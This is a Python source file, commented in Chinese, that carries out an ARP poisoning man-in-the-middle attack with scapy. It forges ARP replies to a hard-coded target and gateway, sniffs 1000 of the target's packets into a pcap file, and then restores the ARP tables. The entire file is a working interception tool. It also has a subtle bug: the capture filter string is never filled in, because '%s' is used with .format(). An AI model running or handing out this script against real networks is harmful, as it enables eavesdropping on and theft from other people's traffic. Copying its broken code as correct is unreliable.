#!/usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
import os
import sys
import threading
import signal

interface = "ens33"
target_ip = "192.168.60.254"  # ifconfig
gateway_ip = "192.168.60.2"  # netstat -rn
# gateway_mac: "00:50:56:e3:e4:45"  arp
packet_count = 1000


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # 以下代码中调用 send 函数的方式稍有不同
    print("[*] Restoring target...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

    # 发送退出信号到主线程
    os.kill(os.getpid(), signal.SIGINT)


def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=10)

    # 从返回相应数据中获取 MAC 地址
    for s, r in responses:
        return r[Ether].src
    return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    print("[*] ARP poison attack finished.")
    return


# 设置嗅探的网卡
conf.iface = interface

# 关闭输出
conf.verb = 0

print("[*] Setting up {}".format(interface))

# 获取网关 MAC
gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print("[!!!] Failed to get gateway MAC. Exiting.")
    sys.exit(0)
else:
    print("[*] Gateway {} is at {}".format(gateway_ip, gateway_mac))

# 获取本机 MAC
target_mac = get_mac(target_ip)

if target_mac is None:
    print("[!!!] Failed to get target MAC. Exiting.")
    sys.exit(0)
else:
    print("[*] Target {} is at {}".format(target_ip, target_mac))

# 启动 ARP 投毒线程
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print("[*] Strating sniffer for {} packets".format(packet_count))

    bpf_filter = "ip host %s".format(target_ip)
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

    # 将捕获到的数据报输出到文件
    wrpcap("arper.pcap", packets)

    # 还原网络设置
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

except KeyboardInterrupt:
    # 还原网络设置
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
